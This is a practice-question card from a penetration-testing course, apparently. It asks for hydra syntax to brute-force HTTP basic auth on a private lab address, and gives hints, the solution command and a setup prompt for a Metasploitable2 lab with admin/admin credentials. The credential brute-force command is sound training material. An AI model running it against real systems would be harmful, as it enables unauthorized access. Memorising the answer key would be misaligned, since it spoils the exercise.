# Q097 — HTTP Basic Auth Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Bruteforce a hypothetical HTTP basic auth endpoint at `http://192.168.52.129/secured/`. Provide hydra syntax.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=hydra -L users.txt -P pass.txt 192.168.52.129 http-get /secured/`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Use `http-get` module.
</details>

<details>
<summary>Hint 2</summary>

Adjust path as needed.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -L users.txt -P pass.txt 192.168.52.129 http-get /secured/
```

Hydra cycles creds.

**Answer:** `cmd=hydra -L users.txt -P pass.txt 192.168.52.129 http-get /secured/`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q097:
1. This is a syntax/recall Q — no real /secured/ endpoint needs to exist.
2. If you want to actually execute: create basic-auth dir on Metasploitable2: ssh msfadmin → sudo mkdir /var/www/secured; htpasswd -cb /etc/apache2/.htpasswd admin admin; add AuthType Basic directive in /etc/apache2/sites-enabled/000-default.conf (optional).

Report back: "Lab ready for Q097 — hydra available; endpoint optional".
```
